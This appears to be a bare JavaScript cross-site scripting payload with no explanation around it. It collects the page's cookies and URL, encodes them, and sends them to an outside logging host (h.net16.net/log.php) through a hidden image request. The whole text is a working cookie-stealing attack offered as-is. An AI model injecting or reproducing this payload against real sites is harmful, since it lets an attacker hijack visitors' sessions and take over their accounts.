cookie = "Cookies:"+document.cookie;
url = "URL:"+document.location;

$data = encodeURIComponent(cookie+url);

var imageObject = new Image();
imageObject.src = "http://h.net16.net/log.php?log="+$data;
